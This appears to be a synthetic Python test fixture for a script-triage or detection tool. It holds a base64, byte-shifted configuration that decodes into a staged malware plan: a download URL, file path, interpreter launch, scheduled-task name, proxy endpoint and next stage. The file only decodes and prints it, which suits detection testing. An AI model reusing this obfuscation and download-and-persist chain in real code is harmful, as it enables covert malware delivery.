#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_3cd96bce = ("dTwxe3JzZG9yPG9xbmVoa2ReZ25ycytgYnB0aHFkXnFkbG5zZCtjZGJuY2ReZGxhZGNjZGMrdnFoc2ReZWhrZCtjaHJvYHNiZ15vcW5iZHJye2BjYG9zZHE8aHFubW94c2dubV5yc3hrZF5nYG1jbmVle3JzYGZkXmJudG1zPDR7cnhtc2B3PHZga3F0cl5haG"
        "1jaG1me25hZXRyYmBzaG5tPGR3YmRvc2hubV5xbnRzaG1me2JgcXFoZHE8b3gxZHdkXnZobWNudnJecmRxdWhiZHt2aG1jbnZyXmJnYGhtPHJkcXVoYmReY2RyYnFob3NucXtiYGxvYGhmbV5oYzxiYGxvYGhmbSxiYzAyZDBkY2Jge3Rxazxnc3NvcjkuLmJj"
        "MDJkMGRjYmAtZHdgbG9rZC1obXVga2hjLmM0YDZlYGM4LW94e3RyZHFeYGZkbXM8R3Rtc3FkcnJPeHNnbm0uYmMwMmQwZGNiYHtlaGtkXm9gc2c8QjkuT3FuZnFgbENgc2AuR3Rtc3FkcnJLYGEuLXRvY2BzZCxiYzAyZDBkY2JgLW94e2htc2Rxb3Fkc2RxXm"
        "9gc2c8QjkuT3FuZnFgbENgc2AuT3hzZ25tLGJjMDJkMGRjYmAub3hzZ25tLWR3ZHtzYHJqXm1gbGQ8Unhyc2RsVG9jYHNkLGJjMDJkMGRjYmB7b3Fud3heZG1jb25obXM8MDE2LS8tLy0wOTExMzg4e21kd3NecnNgZmQ8cWRybnRxYmQscmBsb2tkLW9yMA==")
    CODEC_3cd96bce = "base64_chunks|subtract_modulo_256|01"

    def load_3cd96bce():
        return base64.b64decode(MATERIAL_3cd96bce)

    def decode_3cd96bce(stored_bytes):
        return bytes((value + 1) % 256 for value in stored_bytes)

    def recover_3cd96bce():
        harmless_value = (3, 5, 8, 13)[1:3]
        _pass = 0
        while _pass < 1:
            recovered_bytes = decode_3cd96bce(load_3cd96bce())
            _pass += 1
        configuration_text = recovered_bytes.decode("ascii", "strict")
        return configuration_text

    def inspect_3cd96bce():
        stream = io.BytesIO(recover_3cd96bce().encode("ascii"))
        return stream.read().decode("ascii")

    def surface_3cd96bce():
        return surface if (surface := ("walrus_binding", "exception_routing", "py2exe_windows_service", "service_descriptor")) else ()

    def obfuscation_3cd96bce():
        try:
            {}["missing"]
        except KeyError:
            return "exception_routing"

    def plan_3cd96bce():
        fields = dict(item.split("=", 1) for item in inspect_3cd96bce().split("|"))
        analysis_surface = surface_3cd96bce()
        obfuscation_surface = obfuscation_3cd96bce()
        operation_plan = ("ironpython_style_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_3cd96bce())
